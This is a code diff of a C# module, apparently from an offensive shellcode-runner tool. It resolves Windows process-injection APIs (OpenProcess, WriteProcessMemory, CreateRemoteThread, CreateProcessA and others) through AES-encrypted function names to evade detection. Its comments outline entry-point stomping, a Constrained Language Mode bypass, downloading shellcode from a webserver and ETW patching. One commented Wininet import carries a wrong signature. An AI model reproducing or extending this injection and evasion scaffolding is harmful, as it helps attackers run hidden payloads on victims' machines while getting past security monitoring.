@@ -1,8 +1,7 @@
 ﻿using System;
 using System.Runtime.InteropServices;
-using System.Text;
-using static NetRunners.Data.Structures;
 using static NetRunners.Data.Encrypted;
+using static NetRunners.Data.Structures;
 
 namespace NetRunners.Data
 {
@@ -16,7 +15,7 @@ namespace NetRunners.Data
         public static string Decrypt(byte[] API_String)
         {
             string decrypted = System.Text.Encoding.UTF8.GetString(NetRunners.Decryptors.Decryptors.DecryptBytesToBytes_Aes(API_String, AesKey, AesIV));
-            return decrypted; 
+            return decrypted;
         }
 
         public const uint MEM_COMMIT_RESERVE = 0x00001000 | 0x00002000;
@@ -58,8 +57,8 @@ namespace NetRunners.Data
 
         //// openprocess
         //[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-        //public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
-        public delegate IntPtr pOpenProcess(uint processAccess, bool bInheritHandle, int processId);
+        //public static extern IntPtr OpenProcess(uint processAccess, int bInheritHandle, int processId);
+        public delegate IntPtr pOpenProcess(uint processAccess, int bInheritHandle, int processId);
         public static pOpenProcess OpenProcess = (pOpenProcess)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), Decrypt(OpenProcess_Byte)), typeof(pOpenProcess));
 
         //// virtualallocex
@@ -70,8 +69,8 @@ namespace NetRunners.Data
 
         //// writeprocessmemory
         //[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-        //public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
-        public delegate bool pWriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+        //public static extern int WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+        public delegate int pWriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
         public static pWriteProcessMemory WriteProcessMemory = (pWriteProcessMemory)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), Decrypt(WriteProcessMemory_Byte)), typeof(pWriteProcessMemory));
 
         //// createremotethread
@@ -81,14 +80,14 @@ namespace NetRunners.Data
         public static pCreateRemoteThread CreateRemoteThread = (pCreateRemoteThread)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), Decrypt(CreateRemoteThread_Byte)), typeof(pCreateRemoteThread));
 
         // EntryPoint Stomping Runner
-        // This technique uses WriteProcessMemory, CreateProcess, ZwQueryInformationProcess (ntdll.dll), ReadProcessMemory, ResumeThread
+        // This technique uses WriteProcessMemory, CreateProcess, ZwQueryInformationProcess, ReadProcessMemory, ResumeThread
 
         //// writeprocessmemory already imported
 
         //// import CreateProcess
         //[DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
-        //public static extern bool CreateProcessA(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
-        public delegate bool pCreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+        //public static extern int CreateProcessA(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, int bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+        public delegate int pCreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, int bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
         public static pCreateProcess CreateProcessA = (pCreateProcess)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), Decrypt(CreateProcessA_Byte)), typeof(pCreateProcess));
 
         //// import ZwQueryInformationProcess
@@ -99,8 +98,8 @@ namespace NetRunners.Data
 
         //// import readprocessmemory
         //[DllImport("kernel32.dll", SetLastError = true)]
-        //public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
-        public delegate bool pReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
+        //public static extern int ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
+        public delegate int pReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
         public static pReadProcessMemory ReadProcessMemory = (pReadProcessMemory)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), Decrypt(ReadProcessMemory_Byte)), typeof(pReadProcessMemory));
 
         //// import resumethread
@@ -143,16 +142,45 @@ namespace NetRunners.Data
 
         //// import virtualprotect
         //[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-        //public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-        public delegate bool pVirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+        //public static extern int VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+        public delegate int pVirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
         public static pVirtualProtect VirtualProtect = (pVirtualProtect)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), Decrypt(VirtualProtect_Byte)), typeof(pVirtualProtect));
 
         // CLM Bypass source: https://github.com/calebstewart/bypass-clm/blob/master/bypass-clm/Program.cs
         // this technique uses: GetStdHandle, GetProcAddress, LoadLibrary, VirtualProtect
 
         //[DllImport("kernel32.dll", SetLastError = true)]
-        //private static extern IntPtr GetStdHandle(int nStdHandle);
-        public delegate bool pGetStdHandle(string lpPathName);
+        //public static extern IntPtr GetStdHandle(int nStdHandle);
+        public delegate IntPtr pGetStdHandle(int nStdHandle);
         public static pGetStdHandle GetStdHandle = (pGetStdHandle)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), Decrypt(GetStdHandle_Byte)), typeof(pGetStdHandle));
+                
+        //// Fetching the Shellcode from a webserver
+        //// this technique uses: internetopenw, internetopenurlw, internetreadfile, internetclosehandle, internetsetoptionw
+
+        //// import internetopenw
+        //[DllImport("Wininet.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+        //public static extern IntPtr InternetOpenW(string lpszAgent, uint dwAccessType, string lpszProxy, string lpszProxyBypass, uint dwFlags);
+
+        //// import internetopenurlw
+        //[DllImport("Wininet.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+        //public static extern IntPtr InternetOpenUrlW(IntPtr hInternet, string lpszUrl, string lpszHeaders, uint dwHeadersLength, uint dwFlags, IntPtr dwContext);
+
+        //// import internetreadfile
+        //[DllImport("Wininet.dll", SetLastError = true)]
+        //public static extern IntPtr InternetReadFile(IntPtr hInternet, string lpszUrl, string lpszHeaders, uint dwHeadersLength, uint dwFlags, IntPtr dwContext);
+        //// import internetclosehandle
+        //[DllImport("Wininet.dll", SetLastError = true)]
+        //public static extern int InternetCloseHandle(IntPtr hInternet);
+
+        //// import internetsetoptionw
+        //[DllImport("Wininet.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+        //public static extern int InternetSetOptionW(IntPtr hInternet, uint dwOption, IntPtr lpBuffer, uint dwBufferLength);
+
+        //// import netuseconnectiona
+        //[DllImport("Mpr.dll", CharSet = CharSet.Ansi, SetLastError = true)]
+        //public static extern int WNetUseConnectionA(IntPtr hwndOwner,NETRESOURCE lpNetResource,string lpPassword,string lpUserID,int dwFlags,string lpAccessName,string lpBufferSize,string lpResult);
+
+        // patch ETW
+        // this technique uses: VirtualProtect, GetProcAddress, LoadLibraryA
     }
 }
